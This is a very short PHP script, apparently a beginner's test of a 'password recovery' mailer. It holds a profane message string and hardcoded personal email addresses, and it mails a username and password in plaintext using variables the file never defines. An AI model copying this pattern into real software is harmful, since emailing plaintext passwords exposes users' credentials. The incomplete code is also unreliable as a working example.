
<?php
// the message
$msg = "You motherFuck";

// use wordwrap() if lines are longer than 70 characters

$email="chunhei.cheng.149@my.csun.edu";
//mail("33jamo@gmail.com","My subject",$msg);
mail("$email","Password Recovery","Username: $username\nPassword: $password");
?>


